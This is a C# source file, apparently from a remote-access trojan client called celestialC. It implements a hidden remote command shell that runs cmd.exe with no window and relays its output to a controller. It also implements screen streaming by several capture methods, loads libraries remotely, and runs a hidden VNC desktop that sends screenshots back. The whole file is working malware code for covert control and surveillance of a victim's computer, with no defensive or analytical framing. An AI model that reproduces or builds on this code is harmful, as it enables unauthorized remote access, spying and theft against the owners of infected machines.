using System.Collections.Generic;
using System.Security.Permissions;
using System.Threading;
using System.Diagnostics;
using System.Text;
using celestialC.Helper.Services.compression;
using System;

namespace celestialC.Helper.Service
{
    public static class RemoteShellStream
    {
        private static Thread RemoteShellThread = new Thread(StartRemoteShell);
        private static bool RemoteShellActive { get; set; }
        public static string Input { get; set; }
        public static bool WriteLine { get; set; }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Start()
        {
            if (!RemoteShellActive)
            {
                RemoteShellActive = true;
                try
                {
                    RemoteShellThread.Start();
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void Stop()
        {
            if (RemoteShellActive)
            {
                RemoteShellActive = false;
                try
                {
                    RemoteShellThread.Abort();
                    RemoteShellThread = new Thread(StartRemoteShell);
                }
                catch { }
            }
        }

        private static void StartRemoteShell()
        {
            Process Shell = new Process();
            Shell.StartInfo.FileName = "cmd.exe";
            Shell.StartInfo.CreateNoWindow = true;
            Shell.StartInfo.UseShellExecute = false;
            Shell.StartInfo.RedirectStandardOutput = true;
            Shell.StartInfo.RedirectStandardInput = true;
            Shell.StartInfo.RedirectStandardError = true;
            Shell.OutputDataReceived += OutputHandler;
            Shell.Start();
            Shell.BeginOutputReadLine();
            Shell.StandardInput.WriteLine("chcp 65001");
            while (RemoteShellActive)
            {
                if (!WriteLine) continue;
                Shell.StandardInput.WriteLine(Input);
                WriteLine = false;
            }
        }

        private static void OutputHandler(object SendingProcess, DataReceivedEventArgs OutData)
        {
            StringBuilder Output = new StringBuilder();
            if (!string.IsNullOrEmpty(OutData.Data))
                try
                {
                    Output.Append(OutData.Data);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int)DataType.RemoteShellType);
                    ToSend.AddRange(Encoding.UTF8.GetBytes(Output.ToString()));
                    PacketSender.Send(ToSend.ToArray());
                }
                catch { }
        }
    }
    public static class RemoteDesktopStream
    {
        private static IStreamCodec _unsafeCodec;
        private static Thread RemoteDestkopThread = new Thread(StartRemoteDestkop);
        public static bool RemoteDesktopActive { get; set; }

        private static int qualitystream = 50;
        private static int SleepTime = 200;
        private static int Method = 0;
        public static void Start(int quality, int timeout, int monitor, int method, IStreamCodec _uNsafeCodec)
        {
            _unsafeCodec = _uNsafeCodec;
            if (!RemoteDesktopActive)
            {
                qualitystream = quality;
                _unsafeCodec.ImageQuality = qualitystream;
                SleepTime = timeout;
                RemoteDesktopActive = true;
                Form1.StreamActive = true;
                Method = method;
                if(method == 0)
                {
                       if (!Libs.LoadRemoteLibrary(Libs.SharpDX) || !Libs.LoadRemoteLibrary(Libs.SharpDXD3D9) ||
                           !Libs.LoadRemoteLibrary(Libs.SharpDXD3D11) || !Libs.LoadRemoteLibrary(Libs.SharpDXGI))
                       {
                           return;
                       }
                    if (DuplicateController.Initialize(monitor))
                        RemoteDestkopThread.Start();
                    else
                    {
                        DuplicateController.Dispose();
                        RemoteDesktopActive = false;
                        Form1.StreamActive = false;
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add(21);
                        ToSend.AddRange(Encoding.UTF8.GetBytes("Unsupported"));
                        PacketSender.Send(ToSend.ToArray());
                    }
                }
                else if(method == 1)
                {
                    if (!Libs.LoadRemoteLibrary(Libs.SharpDX) || !Libs.LoadRemoteLibrary(Libs.SharpDXD3D9))
                    {
                        return;
                    }
                    if (DirectXController.Initialize(monitor))
                        RemoteDestkopThread.Start();
                    else
                    {
                        DirectXController.Dispose();
                        RemoteDesktopActive = false;
                        Form1.StreamActive = false;
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add(21);
                        ToSend.AddRange(Encoding.UTF8.GetBytes("Unsupported"));
                        PacketSender.Send(ToSend.ToArray());
                    }
                }
                else if(method == 2)
                {
                    if (GdiController.Initialize(monitor))
                        RemoteDestkopThread.Start();
                    else
                    {
                        GdiController.Dispose();
                        RemoteDesktopActive = false;
                        Form1.StreamActive = false;
                    }
                }

            }
        }

        public static void Stop()
        {
            if (RemoteDesktopActive)
            {
                RemoteDesktopActive = false;
                Form1.StreamActive = false;
                try
                {
                    RemoteDestkopThread.Abort();
                    RemoteDestkopThread = new Thread(StartRemoteDestkop);
                    if (Method == 0)
                        DuplicateController.Dispose();
                    else if (Method == 1)
                        DirectXController.Dispose();
                    else if (Method == 2)
                        GdiController.Dispose();
                    GC.Collect();
                }
                catch { }
            }
        }

        private static void StartRemoteDestkop()
        {
             while (RemoteDesktopActive)
             {
                if(Method == 0)
                {
                    DuplicateController.sendScreenShot(_unsafeCodec);
                }
                else if(Method == 1)
                {
                    DirectXController.sendScreenShot(_unsafeCodec);
                }
                else if(Method == 2)
                {
                    GdiController.sendScreenShot(_unsafeCodec);
                }
                Thread.Sleep(SleepTime);
             }
        }
    }
    public static class HiddenVNC
    {
        private static IStreamCodec _unsafeCodec;
        private static Thread DesktopCapture = new Thread(DesktopCaptureThread);
        public static bool DesktopCaptureing { get; set; }

        private static int qualitystream = 50;
        private static int SleepTime = 200;
        public static void Start(int quality, int timeout, IStreamCodec _uNsafeCodec)
        {
            _unsafeCodec = _uNsafeCodec;
            if (!DesktopCaptureing)
            {
                qualitystream = quality;
                _unsafeCodec.ImageQuality = qualitystream;
                SleepTime = timeout;
                DesktopCaptureing = true;
                Form1.hStreamActive = true;
                if (hVNC.hVNC.Init())
                {
                    DesktopCapture.Start();
                }
                else
                {
                    Form1.hStreamActive = false;
                    DesktopCaptureing = false;
                    hVNC.hVNC.Dispose();
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(21);
                    ToSend.AddRange(Encoding.UTF8.GetBytes("Init Error!"));
                    PacketSender.Send(ToSend.ToArray());
                }
            }
        }

        public static void Stop()
        {
            if(DesktopCaptureing)
            {
                DesktopCaptureing = false;
                Form1.hStreamActive = false;
                DesktopCapture.Abort();
                DesktopCapture = new Thread(DesktopCaptureThread);
                hVNC.hVNC.Dispose();
            }
        }

        private static void DesktopCaptureThread()
        {
            while (DesktopCaptureing)
            {
                hVNC.hVNC.SendScreenShot(_unsafeCodec);
                Thread.Sleep(SleepTime);
            }
        }
    }
}
